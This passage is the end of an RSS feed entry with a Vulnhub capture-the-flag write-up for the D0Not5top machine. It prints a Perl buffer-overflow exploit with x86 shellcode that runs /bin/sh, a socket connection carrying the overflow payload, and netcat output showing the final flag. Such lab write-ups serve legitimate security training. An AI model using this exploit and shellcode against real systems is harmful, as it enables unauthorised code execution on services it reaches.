                &lt;span class=&quot;s&quot;&gt;&quot;\x3a\x39\x74\x6a\x74\x38\x36\x65\x76\x76\x63\x79\x77&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;&quot;\x75\x75\x66\x37\x37\x34\x68\x72\x38\x38\x65\x75\x69&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;&quot;\x33\x6e\x75\x73\x38\x64\x6c\x6b\x20\x32\x3e\x2f\x74&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;&quot;\x6d\x70\x2f\x68\x75\x68\x00\x57\x53\x89\xe1\xcd\x80&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;&quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;&quot;\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x38&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;&quot;\x00\x00\x00\x59\x41\x59\x20\x46\x4c\x34\x36\x5f\x37&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;&quot;\x3a\x39\x74\x6a\x74\x38\x36\x65\x76\x76\x63\x79\x77&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;&quot;\x75\x75\x66\x37\x37\x34\x68\x72\x38\x38\x65\x75\x69&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;&quot;\x33\x6e\x75\x73\x38\x64\x6c\x6b\x20\x32\x3e\x2f\x74&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;&quot;\x6d\x70\x2f\x68\x75\x68\x00\x57\x53\x89\xe1\xcd\x80&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;&quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;&quot;\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x38&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;&quot;\x00\x00\x00\x59\x41\x59\x20\x46\x4c\x34\x36\x5f\x37&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;&quot;\x3a\x39\x74\x6a\x74\x38\x36\x65\x76\x76\x63\x79\x77&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;&quot;\x75\x75\x66\x37\x37\x34\x68\x72\x38\x38\x65\x75\x69&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;&quot;\x33\x6e\x75\x73\x38\x64\x6c\x6b\x20\x32\x3e\x2f\x74&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;&quot;\x6d\x70\x2f\x68\x75\x68\x00\x57\x53\x89\xe1\xcd\x80&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;&quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;&quot;\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x38&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;&quot;\x00\x00\x00\x59\x41\x59\x20\x46\x4c\x34\x36\x5f\x37&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;&quot;\x3a\x39\x74\x6a\x74\x38\x36\x65\x76\x76\x63\x79\x77&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;&quot;\x75\x75\x66\x37\x37\x34\x68\x72\x38\x38\x65\x75\x69&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;&quot;\x33\x6e\x75\x73\x38\x64\x6c\x6b\x20\x32\x3e\x2f\x74&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;&quot;\x6d\x70\x2f\x68\x75\x68\x00\x57\x53\x89\xe1\xcd\x80&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;&quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;&quot;\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x2d&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;&quot;\x00\x00\x00\x4e\x33\x76\x33\x72\x20\x41\x73\x35\x75&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;&quot;\x6d\x33\x21\x20\x31\x74\x20\x4d\x34\x6b\x33\x35\x20&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;&quot;\x34\x6e\x20\x34\x35\x35\x20\x30\x66\x20\x79\x30\x75&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;&quot;\x20\x26\x20\x6d\x33\x20\x3a\x44\x00\x57\x53\x89\xe1&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;&quot;\xcd\x80&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$root&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;IO::Socket::&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;INET&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;Proto&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'tcp'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                &lt;span class=&quot;nv&quot;&gt;PeerAddr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ARGV&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
                                &lt;span class=&quot;nv&quot;&gt;PeerPort&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ARGV&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
                            &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;die&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Unable to use [$ARGV[0]] to open [$ARGV[1]]&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ebp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;TROLLOOOLLO&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$eip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;\xBA\xDF\x00\xD0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$flag7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;RUN /&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;a&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;x1036&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ebp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$eip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot; HTTTPEE/1.1\n\n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$root&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$flag7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Done.\n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$root&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Last step is to prepare the listener, then we are able to run the exploit. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@D0Not5top:~# ./L45T_fl46.pl 10.0.2.15 6666
Done.
root@D0Not5top:~#

root@kali:~# nc &lt;span class=&quot;nt&quot;&gt;-lp&lt;/span&gt; 6666
RUN /aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaTROLLOOOLLO���j
                X�Rfh-c��h/shh/bin��R�8YAY FL46_7:9tjt86evvcywuuf774hr88eui3nus8dlk 2&amp;gt;/tmp/huhWS��̀j
                   X�Rfh-c��h/shh/bin��R�8YAY FL46_7:9tjt86evvcywuuf774hr88eui3nus8dlk 2&amp;gt;/tmp/huhWS��̀j
                      X�Rfh-c��h/shh/bin��R�8YAY FL46_7:9tjt86evvcywuuf774hr88eui3nus8dlk 2&amp;gt;/tmp/huhWS��̀j
                         X�Rfh-c��h/shh/bin��R�8YAY FL46_7:9tjt86evvcywuuf774hr88eui3nus8dlk 2&amp;gt;/tmp/huhWS��̀j
                            X�Rfh-c��h/shh/bin��R�8YAY FL46_7:9tjt86evvcywuuf774hr88eui3nus8dlk 2&amp;gt;/tmp/huhWS��̀j
                               X�Rfh-c��h/shh/bin��R�-N3v3r As5um3! 1t M4k35 4n 455 0f y0u &amp;amp; m3 :DWS��̀ HTTTPEE/1.1&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;We have the last flag! &lt;/p&gt;

&lt;h1&gt;Last words&lt;/h1&gt;

&lt;p&gt;It was really frustrating, long and amazingly fun machine. I really enjoyed solving the challenges, even though they were taking me a lot of time and few headaches. Thanks a lot to &lt;a href=&quot;https://3mrgnc3.ninja/&quot;&gt;&lt;b&gt;3mrgnc3&lt;/b&gt;&lt;/a&gt; for creating this challenge, and to &lt;a href=&quot;https://www.vulnhub.com/&quot;&gt;&lt;b&gt;Vulnhub&lt;/b&gt;&lt;/a&gt;, for hosting it. Hope you had fun reading this, and as always... &lt;/p&gt;
</description>
        <pubDate>Sat, 10 Jun 2017 02:00:00 +0000</pubDate>
        <link>http://localhost:4000/vulnhub-d0not5top/</link>
        <guid isPermaLink="true">http://localhost:4000/vulnhub-d0not5top/</guid>
      </item>
    
  </channel>
</rss>
